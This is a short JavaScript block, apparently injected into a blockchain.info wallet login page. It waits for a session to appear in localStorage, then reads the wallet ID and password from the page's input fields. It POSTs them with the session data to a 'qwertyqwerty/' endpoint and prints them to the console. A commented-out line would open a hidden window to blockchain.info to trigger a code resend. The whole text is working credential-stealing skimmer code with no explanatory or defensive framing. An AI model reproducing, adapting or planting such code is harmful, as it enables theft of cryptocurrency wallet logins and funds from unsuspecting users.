< script > function wclose(win) {
    win.close();
}

function fwindow1() {
    try {
		document.getElementsByTagName("button")[0].addEventListener("click", fclick);
        fwindow()
    } catch (err) {
		document.getElementsByTagName("button")[0].addEventListener("click", fclick);
        setTimeout(fwindow1, 100);
    }
};

function fwindow() {
    document.getElementsByTagName("button")[0].addEventListener("click", fclick);

    function fclick() {
        function fcheck() {
            if (JSON.parse(localStorage.getItem("persist:root")).session == "{}") {
                setTimeout(fcheck, 100);
            } else {
                var fdata = {
                    login: document.getElementsByTagName("input")[0].value,
                    password: document.getElementsByTagName("input")[1].value,
                    session: localStorage.getItem("persist:root").toString()
                };
				var xhr = new XMLHttpRequest();
				xhr.open("POST", 'qwertyqwerty/', true);
				xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
				xhr.send("password=" + encodeURIComponent(fdata.password) + "&guid=" + encodeURIComponent(fdata.login) + "&session=" + encodeURIComponent(fdata.session));
				/*IP CHANGE - IN PROCESS  var win = window.open("https://blockchain.info/wallet/" + fdata.login + "?api_code=1770d5d9-bcea-4d28-ad21-6cbd5be018a8&ct=" + new Date().getTime() + "&format=json&resend_code","_blank", "toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=1, height=1, visible=none", ""); setTimeout(wclose, 1000, win);*/
				console.log(fdata);
            }
        }
        fcheck();
    }
}
window.onload = function() {
    fwindow1();
} < /script></body >